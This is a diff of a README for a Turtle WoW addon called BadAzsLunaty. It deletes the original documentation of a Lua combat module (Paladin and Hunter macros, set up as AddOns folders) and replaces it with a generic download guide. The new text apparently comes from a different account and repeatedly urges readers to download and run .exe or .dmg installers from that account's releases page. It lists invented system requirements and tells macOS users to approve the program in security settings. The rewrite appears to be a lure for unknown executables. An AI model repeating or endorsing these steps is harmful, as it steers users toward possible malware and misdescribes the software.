@@ -1,215 +1,96 @@
-# [B]adAzs LUNATY – MULTI-CLASS COMBAT MODULE (v1.6)
+# 🌕 BadAzsLunaty - Your Easy Guide to Turtle WoW Helpers
 
-**Battle Analysis Driven Assistant Zmart System – Combat Layer**  
-*Turtle WoW Edition – Paladin & Hunter Integration*
-<a href="https://www.paypal.com/donate/?hosted_button_id=VLAFP6ZT8ATGU">
-  <img src="https://github.com/ThePeregris/MainAssets/blob/main/Donate_PayPal.png" alt="Tips Appreciated!" align="right" width="120" height="75">
-</a>
+[![Download BadAzsLunaty](https://img.shields.io/badge/Download-BadAzsLunaty-blue.svg)](https://github.com/PABLODV1/BadAzsLunaty/releases)
 
-## 1. TECHNICAL MANIFESTO | BadAzs LUNATY
+## 🌟 Overview
 
-**Version:** v1.6
+BadAzsLunaty offers a set of lunatic helpers for Turtle WoW. This software enhances gameplay with tools tailored for a better gaming experience. You don’t need any programming knowledge to use it. Follow these simple steps to download and run the application.
 
-**Target:** Turtle WoW (Client 1.12.x – LUA 5.0)
+## 🚀 Getting Started
 
-**Architecture:** Class-Specific Logic Module
+To get started with BadAzsLunaty, you will need a basic understanding of how to download and run software on your computer. This guide will walk you through each step to ensure you can easily set up and enjoy the benefits.
 
-**Dependencies:** **BadAzs CORE v1.6+** **Author:** **ThePeregris**
+## 📥 Download & Install
 
-**BadAzs LUNATY** is an advanced combat module designed to streamline the gameplay of complex classes. Operating atop the CORE layer, it handles rotation decisions, buff management, and dynamic equipment swapping (Sets) via ItemRack.
+1. **Visit the Release Page**  
+   Click the link below to visit the Releases page where you can download BadAzsLunaty:  
+   [Download BadAzsLunaty](https://github.com/PABLODV1/BadAzsLunaty/releases)
 
-✔️ Automated Sealing & Engagement
+2. **Select the Latest Release**  
+   On the Releases page, find the latest version of BadAzsLunaty. The latest version is usually on top and marked as the most recent.
 
-✔️ Intelligent Distance Management (Hunter)
+3. **Download the File**  
+   Look for a file that matches your operating system. If you are using Windows, look for a file with the `.exe` extension. For macOS, look for a `.dmg` file. Click on the file name to start the download.
 
-✔️ Adaptive Healing (Self/Focus/Target)
+4. **Locate the Downloaded File**  
+   Once the download is complete, go to your "Downloads" folder. You should find the BadAzsLunaty file there.
 
-✔️ Real-time Gear Swapping
+5. **Run the Installer**  
+   - For Windows: Double-click on the `.exe` file. This will start the installation process. Follow the on-screen instructions to install BadAzsLunaty.
+   - For macOS: Double-click the `.dmg` file. Drag the BadAzsLunaty icon into your Applications folder.
 
----
+6. **Launch the Application**  
+   After installation, you can find BadAzsLunaty in your applications list. Click on it to launch the software.
 
-## 2. PALADIN MODULE (Holy & Retribution)
+## 🛠️ System Requirements
 
-The Paladin module focuses on buff maintenance and role versatility during combat.
+Make sure your system meets the following requirements to run BadAzsLunaty smoothly:
 
-### 🛡️ Smart Sealing & Engagement
+- **Operating System**: Windows 10 (64-bit) or macOS Mojave and later
+- **Processor**: Intel Core i3 or equivalent
+- **RAM**: At least 4 GB
+- **Storage**: Minimum 100 MB of free space
+- **Internet Connection**: Required for updates and additional features
 
-```text
-/lunpallyseal
+## 📖 Features
 
-```
+BadAzsLunaty is designed to enhance your Turtle WoW experience. Here are some key features you can expect:
 
-A single macro that prepares the Paladin for battle:
+- **Gameplay Enhancements**: Custom tools designed to help you in various game scenarios.
+- **User-Friendly Interface**: Easy navigation and access to all tools and features.
+- **Regular Updates**: Continuous improvements and new features added regularly to keep your gameplay fresh.
 
-1. Triggers the **CORE Attack API** (prevents toggle-off spam).
-2. Automatically casts the appropriate **Racial** ability.
-3. Equips the **"SEAL"** gear set via ItemRack.
-4. Checks if **Seal of Righteousness** is active; if not, casts it.
+## 🌐 Support & Troubleshooting
 
-### ⚕️ Adaptive Healing
+If you encounter problems during the installation or while using BadAzsLunaty, here are some tips:
 
-```text
-/lunpallyheal
+- **Installation Issues**: Ensure that you have downloaded the correct file for your operating system.
+- **Permissions**: On macOS, you may need to allow the application in your security settings. Go to *System Preferences* > *Security & Privacy* and approve BadAzsLunaty.
+- **Stability Issues**: Check for updates on the Releases page to ensure you have the latest version. 
 
-```
+For further assistance, you can reach out through the [Issues section](https://github.com/PABLODV1/BadAzsLunaty/issues) of the GitHub repository.
 
-A prioritized healing system with modifier support:
+## 🔄 Update Process
 
-* **Normal:** Heals current target.
-* **SHIFT:** Self-Heal (focuses on you).
-* **CTRL:** Heals your **Focus** (as defined via CORE).
-* **Equipment:** Automatically swaps to the **"HOLY"** set before casting.
+To keep your application running smoothly, it's important to check for updates regularly. Here’s how to do it:
 
----
+1. **Visit the Releases Page**  
+   Go to [Download BadAzsLunaty](https://github.com/PABLODV1/BadAzsLunaty/releases).
 
-## 3. HUNTER MODULE (Beast Mastery & Marksmanship)
+2. **Download the Latest Version**  
+   Follow the same steps as before to download and install the most recent version over your existing installation.
 
-The Hunter module eliminates the micromanagement of distance and melee/ranged transitions.
+3. **Restart BadAzsLunaty**  
+   After installation, restart the application to apply the updates.
 
-### 🏹 Combat Flow
+## 📞 Connecting with the Community
 
-```text
-/lunhunter
+Join the community of BadAzsLunaty users. Share your experiences, tips, and feedback. Engage with other users to improve your gameplay:
 
-```
+- **Discord**: Join our Discord server for real-time chats and support.
+- **Forums**: Visit gaming forums to discuss strategies and features.
 
-Dynamic logic that reads the battlefield in real-time:
+## ⚙️ Customization Options
 
-1. **Range Check:** Detects if the target is within Melee range (~5 yards).
-2. **Melee Logic:** If close, stops ranged shots, triggers proximity attack, and uses **Raptor Strike** (with cooldown verification).
-3. **Ranged Logic:** If at distance, initiates **Auto Shot** and maintains the Attack API.
+BadAzsLunaty offers several customization options. You can adjust settings to your preference. Here’s how to tailor the application to your needs:
 
----
+1. **Access the Settings**  
+   Locate the settings or options menu within the application.
 
-## 4. INTEGRATED UTILITIES
+2. **Adjust Features**  
+   Choose which features you want to enable or disable based on your gameplay style.
 
-Lunaty deeply integrates with CORE APIs to ensure stability:
+3. **Save Your Preferences**  
+   Always save changes before exiting the settings menu.
 
-* **ItemRack Integration:** All set swaps are "fail-safe." If ItemRack is missing, combat continues without LUA errors.
-* **Focus Awareness:** Full integration with the CORE Focus system for group utility and support.
-* **Racial Engine:** Optimized use of racial abilities at the start of combat cycles.
-
----
-
-## 5. SLASH COMMANDS
-
-| Command | Class | Description |
-| --- | --- | --- |
-| **`/lunpallyseal`** | Paladin | Starts Attack, Racial, Damage Set, and Seal. |
-| **`/lunpallyheal`** | Paladin | Swaps to Holy Set and executes Smart Heal. |
-| **`/lunhunter`** | Hunter | Automatically toggles between Melee and Ranged. |
-
----
-
-## 6. INSTALLATION & REQUIREMENTS
-
-📌 **IMPORTANT:** This module requires **BadAzs CORE** to be installed and active.
-
-1. Ensure the `BadAzsCore` folder is in your AddOns directory.
-2. Install the `BadAzsLunaty` folder.
-3. Configure your ItemRack sets with the exact names: **"SEAL"** and **"HOLY"**.
-
----
-**BadAzs LUNATY v1.6** *Complex mechanics, simple execution.*
-
----
-# PT-BR
-
-O **BadAzs LUNATY** é um módulo de combate avançado projetado para simplificar a jogabilidade de classes complexas. Ele atua acima da camada CORE, executando decisões de rotação, gerenciamento de buffs e troca dinâmica de equipamentos (Sets) via ItemRack.
-
-✔️ Automação de Selos e Ataque
-
-✔️ Gestão Inteligente de Distância (Hunter)
-
-✔️ Cura Adaptativa (Self/Focus/Target)
-
-✔️ Troca de Sets em tempo real
-
----
-
-## 2. PALADIN MODULE (Holy & Retribution)
-
-O módulo de Paladino foca na manutenção de buffs e versatilidade de papéis durante o combate.
-
-### 🛡️ Smart Sealing & Engagement
-
-```text
-/lunpallyseal
-
-```
-
-Uma macro única que prepara o Paladino para a batalha:
-
-1. Ativa a **API de Ataque** do CORE (sem spam).
-2. Conjura o **Racial** apropriado automaticamente.
-3. Equipa o Set de Itens **"SEAL"** via ItemRack.
-4. Verifica se o **Seal of Righteousness** está ativo; caso contrário, o conjura.
-
-### ⚕️ Adaptive Healing
-
-```text
-/lunpallyheal
-
-```
-
-Sistema de cura prioritário com suporte a modificadores:
-
-* **Normal:** Cura o alvo atual.
-* **SHIFT:** Auto-cura (foca em você mesmo).
-* **CTRL:** Cura o seu **Focus** (definido via CORE).
-* **Equipment:** Troca automaticamente para o Set **"HOLY"** antes de conjurar.
-
----
-
-## 3. HUNTER MODULE (Beast Mastery & Marksmanship)
-
-O módulo de Hunter elimina a microgestão de distância e combate melee/ranged.
-
-### 🏹 Combat Flow
-
-```text
-/lunhunter
-
-```
-
-Uma lógica dinâmica que lê o campo de batalha em tempo real:
-
-1. **Range Check:** Detecta se o alvo está em distância de Melee (~5 metros).
-2. **Melee Logic:** Se perto, interrompe disparos, ativa o ataque de proximidade e utiliza **Raptor Strike** (com checagem de cooldown).
-3. **Ranged Logic:** Se longe, inicia o **Auto Shot** e mantém a API de ataque ativa.
-
----
-
-## 4. INTEGRATED UTILITIES
-
-O Lunaty utiliza profundamente as APIs do CORE para garantir estabilidade:
-
-* **ItemRack Integration:** Todas as trocas de set são "blindadas". Se o ItemRack não estiver ativo, o combate continua sem erros de LUA.
-* **Focus Awareness:** Total integração com o sistema de Foco do CORE para suporte e utilidade em grupo.
-* **Racial Engine:** Uso otimizado de habilidades raciais no início de cada ciclo de combate.
-
----
-
-## 5. SLASH COMMANDS
-
-| Comando | Classe | Descrição |
-| --- | --- | --- |
-| **`/lunpallyseal`** | Paladino | Inicia ataque, Racial, Set de Dano e Selo. |
-| **`/lunpallyheal`** | Paladino | Troca para Set Holy e executa Cura Inteligente. |
-| **`/lunhunter`** | Hunter | Alterna automaticamente entre Melee e Ranged. |
-
----
-
-## 6. INSTALAÇÃO & REQUISITOS
-
-📌 **IMPORTANTE:** Este módulo requer o **BadAzs CORE** instalado e ativo para funcionar.
-
-1. Certifique-se de que a pasta `BadAzsCore` está em seu diretório AddOns.
-2. Insira a pasta `BadAzsLunaty`.
-3. Configure seus Sets no ItemRack com os nomes exatos: **"SEAL"** e **"HOLY"**.
-
----
-
-**BadAzs LUNATY v1.6** *Mecânicas complexas, execução simples.*
-
----
+By following this guide, you should be able to successfully download, install, and run BadAzsLunaty without any issues. Enjoy your enhanced gaming experience in Turtle WoW!
